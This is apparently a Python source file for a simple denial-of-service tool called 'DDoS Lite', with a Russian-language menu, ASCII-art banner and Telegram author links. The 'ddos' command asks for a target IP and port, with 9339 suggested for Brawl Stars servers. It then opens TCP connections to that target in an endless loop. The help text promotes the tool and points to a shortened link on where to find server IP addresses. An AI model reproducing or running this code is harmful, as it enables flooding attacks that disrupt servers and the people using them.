import socket
from time import sleep
import os
from colorama import Fore

while True:
			run = 666
			while run != 1:
				os.system('cls' if os.name == 'nt' else 'clear')
				print(f"""{Fore.RED}
██████╗░██████╗░░█████╗░░██████╗
██╔══██╗██╔══██╗██╔══██╗██╔════╝
██║░░██║██║░░██║██║░░██║╚█████╗░
██║░░██║██║░░██║██║░░██║░╚═══██╗
██████╔╝██████╔╝╚█████╔╝██████╔╝
╚═════╝░╚═════╝░░╚════╝░╚═════╝░{Fore.BLUE}

██╗░░░░░██╗████████╗███████╗
██║░░░░░██║╚══██╔══╝██╔════╝
██║░░░░░██║░░░██║░░░█████╗░░
██║░░░░░██║░░░██║░░░██╔══╝░░
███████╗██║░░░██║░░░███████╗
╚══════╝╚═╝░░░╚═╝░░░╚══════╝
{Fore.GREEN}by AmokDev{Fore.RESET}
{Fore.YELLOW}
******************
Команды
Помощь - help
Ддос - ddos
******************
""")
				word = input(f'{Fore.RED}>>> {Fore.GREEN}')
				if word == "ddos" or word == "help":
					run = 1
				else:
					print('[x] Неизвестная команда')
					sleep(0.60)

			if word == 'ddos':
				sleep(1)
				ip = input("Введите ip адрес: ")
				port = int(input("Введите порт (для BS 9339): "))
				i = 0
				while True:
					i += 1
					socket.socket().connect((ip, port))
					print(f"Ddos: {ip} | Count: {i}")

			if word == 'help':
				print("""
TG: https://t.me/dummy_team
CREATOR: https://t.me/AmokDev

Для запуска ддос атаки вам потребуется ввести в поле ввода текст ddos, далее вводим ip адрес сервера и порт (по стандарту в Brawl Stars стоит 9339)

Q: Где мне взять ip-адрес?? 
A: Расскажу по ссылке: https://moneyz.fun/LutGYM
""")
				input(f'\n[*] {Fore.RED}Для продолжения нажмите ENTER')
